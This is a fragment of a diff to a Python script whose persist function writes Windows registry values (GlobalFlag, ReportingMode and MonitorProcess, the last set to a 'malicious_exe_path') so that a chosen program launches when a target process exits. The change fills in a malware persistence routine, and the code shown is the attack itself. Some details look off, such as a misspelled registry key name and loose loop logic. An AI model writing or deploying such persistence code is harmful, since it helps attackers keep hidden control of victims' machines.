@@ -60,9 +60,9 @@ def persist(malicious_exe_path:str, target_exe:str, target_reg_keys:list):
         for i in range(QueryInfoKey(target_key)[0]):
           if "Image File Exection" in reg_key:
             SetValueEx(hklm, "GlobalFlag", 0, REG_DWORD, 512)
-            pass
           else:
-            pass
+            SetValueEx(hklm, "ReportingMode", 0, REG_DWORD, 1)
+            SetValueEx(hklm, "MonitorProcess", 0, REG_SZ, malicious_exe_path)
 
 if __name__ == "__main__":
   target_exe = argv[1]
